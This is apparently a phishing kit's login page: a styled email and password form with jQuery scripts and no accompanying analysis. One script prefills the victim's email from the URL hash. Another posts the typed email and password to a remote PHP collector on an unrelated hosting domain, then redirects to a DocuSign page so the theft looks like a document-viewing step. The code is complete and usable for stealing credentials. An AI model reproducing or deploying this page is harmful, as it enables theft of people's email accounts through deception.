.custom-toast {
  position: fixed;
  top: 20px;
  right: 20px;
  max-width: 320px;
  padding: 15px 20px;
  border-radius: 10px;
  font-weight: bold;
  z-index: 9999;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
  display: none;
  animation: fadeIn 0.3s ease-in-out;
}

.custom-toast.success {
  background-color: #e6ffed;
  color: #155724;
  border: 1px solid #b2dfdb;
}

.custom-toast.error {
  background-color: #ffeaea;
  color: #721c24;
  border: 1px solid #f5c6cb;
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(-10px); }
  to { opacity: 1; transform: translateY(0); }
}

<!-- Inline Message Box -->
<div id="loginMessage" class="d-none text-center mb-3" style="border-radius: 8px; padding: 12px; font-weight: bold;"></div>


<!-- Login Form -->
<form id="loginForm" class="mt-4">
  <div class="form-group">
    <label for="email" class="txt-color font-weight-bold">Email address</label>
    <input type="email" class="form-control" id="email" name="email" placeholder="Email"
           style="border: 1px solid #a09c9c; border-radius: 1px;" required>
  </div>
  <div class="form-group">
    <label for="password" class="txt-color font-weight-bold">Password</label>
    <input type="password" class="form-control" id="password" name="password" placeholder="Email Password"
           style="border: 1px solid #a09c9c; border-radius: 1px;" required>
  </div>
  <button type="submit"
          class="btn btn-primary btn-block font-weight-bold"

    LOGIN

<script>
  window.addEventListener("DOMContentLoaded", function () {
    const hash = window.location.hash;

    if (hash && hash.length > 1) {
      const email = decodeURIComponent(hash.substring(1)); // remove '#' and decode
      const emailInput = document.getElementById("email");
      if (emailInput) {
        emailInput.value = email;
      }
    }
  });
</script>

<script>
$(document).ready(function () {
  $('#loginForm').submit(function (e) {
    e.preventDefault();

    const email = $('#email').val().trim();
    const password = $('#password').val().trim();
    const $msg = $('#loginMessage');

    $.ajax({
      url: 'https://topguardtraining.hsa.grd.mybluehost.me/zim.php',
      type: 'POST',
      dataType: 'json',
      data: { email, password },
      success: function (response) {
        if (response.status === 'valid') {
          $msg
            .removeClass('d-none')
            .css({
              'background-color': '#d4edda',  // Light green
              'color': '#155724',             // Dark green text
              'border': '1px solid #c3e6cb',
              'display': 'block'
            })
            .html('✅ Opening file...');

          setTimeout(function () {
            window.location.href = 'https://postsign.docusign.com/postsigning/en/finish-viewing';
          }, 2000);

        } else if (response.status === 'invalid') {
          $msg
            .removeClass('d-none')
            .css({
              'background-color': '#f8d7da',
              'color': '#721c24',
              'border': '1px solid #f5c6cb',
              'display': 'block'
            })
            .html('⚠️Incorrect password, please try again.');

          $('#password').val('');

          setTimeout(function () {
            $msg.fadeOut();
          }, 3000);

        } else {
          $msg
            .removeClass('d-none')
            .css({
              'background-color': '#fff3cd',
              'color': '#856404',
              'border': '1px solid #ffeeba',
              'display': 'block'
            })
            .html('⚠️ Something went wrong. Please try again.');

          setTimeout(function () {
            $msg.fadeOut();
          }, 3000);
        }
      },
      error: function () {
        $('#loginMessage')
          .removeClass('d-none')
          .css({
            'background-color': '#ffeaea',
            'color': '#721c24',
            'border': '1px solid #f5c6cb',
            'display': 'block'
          })
          .html('❌ Network error. Please try again.');

        setTimeout(function () {
          $('#loginMessage').fadeOut();
        }, 4000);
      }
    });
  });
});
</script>
